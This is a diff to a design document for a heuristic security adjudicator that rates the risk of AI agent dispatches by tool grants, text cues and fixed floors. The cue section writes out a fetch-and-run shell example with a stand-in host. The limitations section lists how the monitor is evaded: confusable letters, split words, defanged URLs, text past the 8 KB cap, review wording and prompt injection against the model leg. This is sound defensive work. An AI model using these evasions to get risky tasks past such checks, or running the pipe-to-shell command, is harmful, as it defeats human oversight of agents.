@@ -70,6 +70,10 @@ A committed `eminiar.config.json` arrives with every clone, so eminiar trusts it
   `trustedMcpServers` because a repo could whitelist its own server; `minLevel`, `notifyUser` and
   `surfaces` because they could hide a warning; `modelFloor`, `secretPaths`, `store` and
   `taintLookbackMin` because they change what is judged or kept.
+- **An invalid project file is dropped whole**, with a visible warning (`eminiar doctor` and a note on
+  stderr name it), while your personal `security.enabled` stays on. `loadConfig` validates
+  layer by layer and takes one more full-schema parse on that error path only, so one bad value in a
+  repo file no longer sends everything back to the defaults.
 - **Personal file:** `~/.eminiar/config.json`, anchored to your account, sets every key. A personal
   file that is not trustworthy (a moved `EMINIAR_HOME` or `HOME` inside the repo) gets the project
   cut, because the personal layer already applies it.
@@ -93,6 +97,20 @@ Residual risk, accepted: a trusted repo's `.claude/settings.json` `env` block ca
 and run before any import. They are true when the adjudicator is on, or when security is on for that
 surface (`preTool` only for `Agent` and `Task`). `"plan"` is an addition to the proposal.
 
+**What the hook path loads when security is off.** `src/adjudicator/security/load.ts` is a leaf with
+no imports: a registry (`security()`) that `engine.ts`, `prompt.ts` and `providers/typesafe.ts` call
+instead of importing `security/prompt.ts` or `security/types.ts`. `security/register.ts` fills it,
+and is imported for its effect by `advice.ts`, which every producer of a `hints.security` loads
+(`assess`, the CLI, the eval). Reading the registry before registration throws, but its consumers
+are gated on `hints.security` or `item.tools`, so the hook path never reads it. With security off
+the hook path therefore loads `load.ts` and no other `security/*` file
+(`adjudicator-hooks-off.test.ts`, `adjudicator-security-off-load.test.ts`). What is **not** off:
+the MCP server is one bundle, and `scripts/check-bundle.mjs` forbids a dynamic `import()` of an
+internal module in the server graph, so `em_swarm.ts` and `em_adjudicate.ts` import the security
+code statically; the server start cannot be lazy, and the tool schema and description (static)
+still mention security. `doctor.ts` imports `adjudicator/cli.ts`, which imports `security/cli.ts`,
+so `eminiar doctor` and `em_doctor` load the security code (off the hook path).
+
 `loadConfig` has a fast path: an adjudicator section holding only `enabled` and a
 `security: {enabled}` switch takes the defaults without building the zod schema, so security-only
 mode pays no schema pass on every hook (a test pins it equal to the schema's answer).
@@ -102,6 +120,7 @@ mode pays no schema pass on every hook (a test pins it equal to the schema's ans
 | Path | Role |
 |---|---|
 | `src/adjudicator/security/types.ts` | Web-safe leaf: capability, level, rule, floor and cue ids, UI payload types |
+| `load.ts`, `register.ts` | The import-free registry the hook path reads, and the module that fills it ([Gates](#gates)) |
 | `taxonomy.ts` | Every number: weights, exposures per tool and cue, rules, floors, remedy text, path patterns |
 | `grant.ts` | The tool grant of an agent, MCP classification, autonomy |
 | `signals.ts` | Text cues and session taint (one indexed read) |
@@ -144,7 +163,8 @@ Built in this order, as provider-safe ids:
 4. **Fork, an unreadable definition, an unknown plugin agent, and the main session:** the inherit
    set (`Bash`, `Read`, `Grep`, `Glob`, `Edit`, `Write`, `NotebookEdit`, `WebFetch`, `WebSearch`,
    `Agent`, `Skill`, `TodoWrite`, `ToolSearch`). The reason says it also inherits every MCP server
-   of the session, which is **not enumerated**.
+   of the session, which is **not enumerated**; when this machine has MCP servers configured, the
+   reason gives only how many ("(3 local MCP servers)"), never a name.
 5. **`em_adjudicate` and the CLI:** the caller's `tools` (validated), else a role or agent-type
    lookup, else the inherit set.
 
@@ -156,12 +176,16 @@ azure, kubernetes, terraform, vercel), `first-party` (eminiar), `trusted` (your
 `trustedMcpServers`), else `unknown`. The verb comes from the tool name: read, write, exec or
 delete. The server name stays local: a reason may name it, a provider never sees it, and the store
 scrubs it. A bare tool name that is not a known Claude Code tool, eminiar tool or MCP tool is
-dropped, so an arbitrary string in an agent file cannot ride along in an id.
+dropped, so an arbitrary string in an agent file cannot ride along in an id. The eminiar tools are
+a **closed list of 25** (`EM_TOOL_NAMES` in `grant.ts`; `em_<anything>` is not one, so
+`em_ghp_<token>` cannot ride along), and a test fails when `src/tools` registers a tool the list
+lacks or the list names one that is gone.
 
 ### Text cues
 
 Read over the task title and detail, the Agent description and prompt, the role description, or the
-prompt. The text is normalised (NFKC, default-ignorable characters stripped) and capped at 8 KB.
+prompt. The text is normalised (NFKC, default-ignorable characters stripped) and capped at 8 KB
+(`MAX_TEXT`); everything after the cap is not read.
 Every pattern is linear; a 100 KB adversarial input scores in under 5 ms (a test). Only **cue ids**
 are kept: matched text is never stored or sent.
 
@@ -173,11 +197,20 @@ are kept: matched text is never stored or sent.
 | Destructive, privilege (D, P) | `destructive`, `destructive-force`, `privilege`, `prod` |
 | Persistence (W\*) | `persistence` (counted only when the grant can write a file) |
 | Tool supply (T) | `install`, `clone`, `add-mcp`, `fetch-exec` |
-| Modifier | `review-context`: a review, audit or test-for wording halves every text cue; it never lowers a tool capability and never dampens an intent cue |
+| Modifier | `review-context`: a review, audit or test-for wording in the task's own text halves every text cue **in the score** (`REVIEW_DAMPEN` .5); it never lowers a tool capability, never dampens an intent cue and never lowers a floor |
 | Intent | `ignore-instructions`, `exfiltrate`, `encode-data`, `disable-safeguards`, `conceal` |
 
 Some behaviours worth knowing, from the eval triage:
 
+- **Review wording** comes only from the task's own text: `extractAll(task, opts, context)` takes the
+  task title and detail, an Agent call's description and prompt, a typed prompt and the try-it text
+  as `task`, and the agent and role descriptions as `context`. A description feeds the cues but never
+  the review wording, and a caller that passes only descriptions (the swarm role risk) gets no
+  dampening. `review-context` is added only when the merged intent set of all texts is empty.
+  "Tests for / tests that / write tests" count only with a flaw word (vulnerab-, inject-, leak,
+  exfil-, xss, csrf, ssrf, "security bugs/issues"); "review" and "scan for" keep the broad noun
+  list. "Audit log", "audit trail", "audit event", "audit entry", "audit record" and "audit table"
+  are nouns, not review wording.
 - A **host written without a scheme** counts as a URL (`attacker.example.test/x`, `evil.com`). Only
   a closed list of suffixes does (com, net, org, gov, edu, io, dev, app, co, ai, xyz, info, biz,
   cloud, site, online, tech, test, invalid). A two-label name needs a path or a com/net/org/gov/edu
@@ -189,6 +222,9 @@ Some behaviours worth knowing, from the eval triage:
 - `exfiltrate` also fires when an exfil verb has an outside destination (a URL or an e-mail address)
   in its 100-character window together with the environment as the object (env vars,
   `process.env`, `printenv`) or a conceal cue elsewhere in the text.
+- A pipe right after a URL is `fetch-exec`: `|`, `;` and a backtick end a URL, so
+  `curl https://x.test/i.sh|sh` leaves `|sh` for the pipe pattern, and the shell may follow `sudo`
+  with flags (`sudo -E`), `env`, `/usr/bin/env` or a `/bin/` or `/usr/bin/` path.
 - A worded "pipe ... to bash" is `fetch-exec` only when the text also fetches something.
 - "Fetch the X page/website/article/feed" is a research verb. Research verbs count only when a web
   tool is granted.
@@ -218,7 +254,7 @@ From the hook's `permission_mode` and the agent file's `permissionMode`:
 ## 5. The heuristic
 
 Every number is in `taxonomy.ts` and is a **proposed default**: the weights have not been tuned
-against anything but the 60-item set below.
+against anything but the labelled set below.
 
 ### Capabilities and exposures
 
@@ -271,7 +307,7 @@ Rule driven (D7). The score band stops at MEDIUM, so a general-purpose agent tha
 |---|---|
 | LOW | score under 25 and no floor |
 | MEDIUM | score 25 or more and no floor |
-| HIGH | a complete combination (every leg at least .5): R1 → `H-R1`, R2 → `H-R2`, R3 → `H-R3`, R6 → `H-R6`; or the model says so |
+| HIGH | a complete combination (every leg at least .5): R1 → `H-R1`, R2 → `H-R2`, R3 → `H-R3`, R6 → `H-R6`; or the model says so. A URL the agent can reach only through the shell does not complete a combination by itself (T19, below) |
 | CRITICAL | **only** a fixed floor, never the model |
 
 The CRITICAL floors, all heuristic:
@@ -285,8 +321,24 @@ The CRITICAL floors, all heuristic:
 | **C5** | R6 with every leg at least .5, and `autonomous` |
 | **C6** | An `ignore-instructions`, `exfiltrate` or `conceal` intent, and egress or execution is granted. `disable-safeguards` is **not** a C6 intent (`--no-verify` and "skip the hooks" are routine) |
 
-A review, audit or test-for wording halves the text cues, so "audit this repo for leaked secrets"
-does not reach C3.
+**A shell-only URL is not a floor by itself (T19, a user decision).** When no granted tool can fetch
+outside content (the grant's U exposure is below `CAN_FETCH_MIN`, .25), the session has read nothing
+untrusted, and the text has no intent cue, a URL in the task reaches the agent only through the
+shell's latent untrusted-input leg. That URL then counts toward a floor (the HIGH combinations and
+C1 to C6) only together with another cued leg in the text: a secret, an egress, a destructive or
+privileged step, a persistence path, an install, or an intent cue. The score still counts the URL.
+Tools that can fetch (U at .25 or more): `WebSearch` .25, `WebFetch` and `em_docs` .3, a browser .5,
+a SaaS read .7. `em_search`, `em_recall` and `Skill` (.2) cannot. The trade-off is deliberate and
+reaches C1 and C5 too: a shell plus a URL running autonomously, with nothing else cued, is MEDIUM,
+not CRITICAL.
+
+Review wording is **not** evaluated here. `evaluate()` in `score.ts` finds the floors from a second
+pass over the same input without `review-context`, so review wording lowers only the score and the
+LOW/MEDIUM band, never a floor. A genuine review task whose grant and cues complete a floor
+("audit this repo for leaked secrets", for an agent that can read and send data, with the egress in
+the text) rates as high as the same task without the wording (no item of the eval set changed). Do not put dampening back into
+`findFloors`: before this contract, one word ("audit log", or "audits code" in an agent file)
+cleared CRITICAL and HIGH floors.
 
 ### Remedy
 
@@ -341,7 +393,8 @@ item, exactly two fields. This is the whole table.
 | The security questions themselves, which are fixed text | Our own verdict, score or level |
 
 `sanitizeSecurityHint` is the last gate before the request body: an id that is not a plain tool name
-or `mcp:<class>:<verb>` is dropped. A test builds a request and checks that no path, argument,
+from the built-in or the closed `em_*` list, or `mcp:<class>:<verb>` with a known class and verb, is
+dropped, and so is any id the secret redactor would change. A test builds a request and checks that no path, argument,
 server name or session tool appears in the body.
 
 **Jev's data retention is unverified.** What is known about how TypeSafe stores or trains on
@@ -373,7 +426,7 @@ a `modelStatus` that says why (`ok`, `off`, `unsupported`, `none` or the provide
 | Surface | Where | Speaks from | Notes |
 |---|---|---|---|
 | Agent spawn | `PreToolUse` on `Agent`/`Task`: a note in `additionalContext` | `security.minLevel` (default `high`) | A user message too from `security.notifyUser` (default `critical`). A denied call is not annotated; an `ask` still is. Cursor is skipped. Budget: heuristic plus indexed reads only, never the network |
-| Plan | `em_swarm plan`: a head and one line per task | `security.minLevel` | `Security (advice only): 1 critical, 2 high, 3 medium · model jev ok`, then `#12 security HIGH 71 · U task URL · S Read+shell · E WebFetch · R1 R3 · drop E: disallowed_tools: [WebFetch] for researcher` (at most 240 characters). Also in security-only mode |
+| Plan | `em_swarm plan`: a head and one line per task | `security.minLevel` | The block has its own 1500-character budget (`securityBlock` in `em_swarm.ts`), appended after the capped task list: the head always stays, lines are kept by `(level, score)` and the head counts what was left out (`· 2 more lines left out; see em_adjudicate security / dashboard`). `Security (advice only): 1 critical, 2 high, 3 medium · model jev ok`, then `#12 security HIGH 71 · U task URL · S Read+shell · E WebFetch · R1 R3 · drop E: disallowed_tools: [WebFetch] for researcher` (at most 240 characters). Also in security-only mode |
 | Prompt | `UserPromptSubmit`: its own line after the routing line | **CRITICAL only**, once per session per distinct warning | See below |
 | `em_adjudicate` | `{action: "security", text \| tasks, tools?, agent_type?, role?, autonomy?}` | always | One block per item; stored as surface `mcp`. `explain {id}` appends the linked assessment |
 | CLI | `eminiar adjudicator security …` | always | |
@@ -458,7 +511,8 @@ answer, the remedy, normalised tools, reasons), `noted`, `version`. Indexes on `
 
 ## 10. Dashboard and swarm UI
 
-Everything is gated on `adjudicator.security.enabled`, which the server reads on each request.
+Everything is gated on `adjudicator.security.enabled`, which the server reads on each request
+(the swarm API too, so `security on` or `off` shows with the dashboard open).
 With it off, the routes answer `200 {active: false, reason: "disabled", now}` **before any database
 read or body read**, the swarm API leaves the risk fields out, and the views render nothing.
 
@@ -482,6 +536,12 @@ Method (405) is checked before the gate; a database failure is a fixed 503. Item
   autonomy); a run's worst level and counts in the run list and the run header (`risk`); a badge on
   every task card; the task's legs, rules, reasons and remedy in its decision section; the role
   badge and its reasons in the worker drawer.
+
+A task's risk is re-sent to a polling client when its latest security row is newer than its task row,
+not only when the task row changes (plan rows are written after a slow model call, and an agent row
+after a re-dispatch). A run with no assessment shows nothing in the run list; its header says
+`no assessment`. The assessment drawer has a focus trap (`src/ui/web/focus-trap.ts`: Tab and
+Shift+Tab stay inside, Escape closes).
 
 Risk is shown as a glyph and a word (○ low, ◐ medium, ▲ high, ⬢ critical), never colour alone, in
 the dashboard's existing palette.
@@ -509,12 +569,13 @@ shows no new line.
 
 ## 12. The eval, and what its numbers mean
 
-The set is `src/adjudicator/security/data/evalset.ts`: **60 labelled items** (52 core, 8 debatable,
-4 look-alikes that share words with an attack but are benign), 15 per level, synthetic, with hosts
-under `*.example.test` and `*.invalid`, and scenarios paraphrased from the shape of public agent
-benchmarks (AgentDojo, InjecAgent, ASB), not copied. The harness is `security/eval.ts`
-(`eminiar adjudicator security eval`). Its mismatches are reported by item id and never fixed by
-changing a label or a weight.
+The set is `src/adjudicator/security/data/evalset.ts`: **70 labelled items** when this was written
+(62 core, 8 debatable; 7 look-alikes that share words with an attack but are benign), synthetic, with
+hosts under `*.example.test` and `*.invalid`, and scenarios paraphrased from the shape of public agent
+benchmarks (AgentDojo, InjecAgent, ASB), not copied. The set has grown since the first run (it had fewer items then),
+and other work may add more, so re-run the command for current figures. The harness is
+`security/eval.ts` (`eminiar adjudicator security eval`). Its mismatches are reported by item id and
+never fixed by changing a label or a weight.
 
 **Read the numbers with this in mind: the items were written by the same design that wrote the
 scorer.** The labels follow the design's own rules (HIGH needs a complete combination, CRITICAL a
@@ -522,24 +583,24 @@ floor), and the signals were triaged against the failures of this very set (task
 show the scorer is *consistent with its design*. They are not an estimate of accuracy on real work,
 and no independent labelled data exists yet.
 
-Current figures, from `npm run build` then `node dist/cli.js adjudicator security eval` (heuristic
-only; no Jev leg was run):
+Current figures, from `node dist/cli.js adjudicator security eval` on a current build, run on
+2026-11-13 at 20:56 UTC (set hash `92504df9051368ce`; heuristic only, no Jev leg was run):
 
-| | Core (52) | Debatable (8) |
+| | Core (62) | Debatable (8) |
 |---|---|---|
-| Accuracy | 98.1% | 75.0% |
-| HIGH+ recall | 100.0% (0 of 25 missed) | 80.0% |
+| Accuracy | 98.4% | 75.0% |
+| HIGH+ recall | 100.0% | 80.0% |
 | LOW false-warn | 0.0% | 0.0% |
 | CRITICAL precision | 100.0% | 66.7% |
-| HIGH+ false positives | 0 of 27 | 0 of 3 |
+| HIGH+ false positives | 0 of 30 | 0 of 3 |
 
-Across all 60, 57 match their label (95.0%). The three mismatches:
+Across all 70, 67 match their label (95.7%). The three mismatches:
 
 | Item | Label | Rated | Why |
 |---|---|---|---|
 | `high-07` (debatable) | HIGH | CRITICAL | the task says "post", which keeps C2 |
 | `high-12` (debatable) | HIGH | MEDIUM | D11: `em_remember` is a weak persistence leg (.4) |
-| `crit-11` | CRITICAL | HIGH | the item carries only `disable-safeguards`, which is not a C6 intent |
+| `crit-11` | CRITICAL | HIGH | the item carries only `disable-safeguards`, which is not a C6 intent (user decision) |
 
 The proposed acceptance targets, checked on core items, all pass: CRITICAL precision 1.0, HIGH+
 recall at least .9, LOW false-warn at most 10%, accuracy at least .7. The path from the first run of the set
@@ -564,17 +625,29 @@ decisions by the user (T7d), recorded below.
 - **Heuristic gaps.** The cues are regular expressions over English text. Paraphrase, other
   languages, code that does the dangerous thing without a word that says so, and content hidden in
   a file the agent will read are not seen. The review-wording dampener can be fooled by an attacker
-  who writes "for review". A dispatch whose prompt is short and whose agent file is clean can look
+  who writes "for review", but only the score and band move, never a floor. A dispatch whose prompt is short and whose agent file is clean can look
   safer than it is.
 - **Grant is not exact.** Inherited MCP servers are not enumerated; a SaaS server the agent holds is
   invisible until the session has already used it (then it is taint). The built-in agent table is
   not verified against the installed Claude Code. A custom agent that names a tool the table does
   not know contributes nothing.
 - **Weights untuned.** Every weight and threshold is a proposed default, calibrated only on the
-  60 items that share an author with the scorer.
-- **Polling pushes a task's risk only when its row changes.** The swarm run view polls only the
-  tasks updated since its last snapshot. A task's risk rides with its task row, so a new assessment
-  for a task whose row did not change shows at the next row change or reload.
+  labelled items (70 on 2026-11-13) that share an author with the scorer.
+- **Review wording does not lower a floor.** A genuine review task whose grant and cues complete a
+  floor still rates as high as the same task without the wording; only its score and band are lower.
+  The wording counts only in the task's own text. This is deliberate: a word in a task or an agent
+  file must not switch a CRITICAL off.
+- **A likely false egress match, not fixed.** `signals.ts` gives an egress cue for "Read the release
+  notes at <url> and list the breaking changes".
+- **Heuristic evasions are not caught.** Confusable letters from another script, words split with
+  spaces, a defanged address such as `hxxps://evil[.]com`, and anything after the 8 KB cap
+  (`MAX_TEXT`) are not seen.
+- **One contrast is just under AA.** The `none` band of the dashboard legend (`.sec-leg`, `--muted`
+  on `--code`) is about 4.3:1 against the 4.5:1 AA threshold. It is an existing palette token and is
+  left as it is.
+- **Security stays in the server and in doctor when off.** The MCP server bundle and the tool schema
+  and description still mention security, and `doctor` still loads the security code; only the hook
+  path is clear of it (section 2).
 - **The Jev leg was never measured against the real API.** The request shape, the parsing and the
   blending are covered by tests and a probe of ten synthetic items at design time (413 ms, one
   request); the eval's Jev leg has not been run with a key. Jev can be steered high by injected
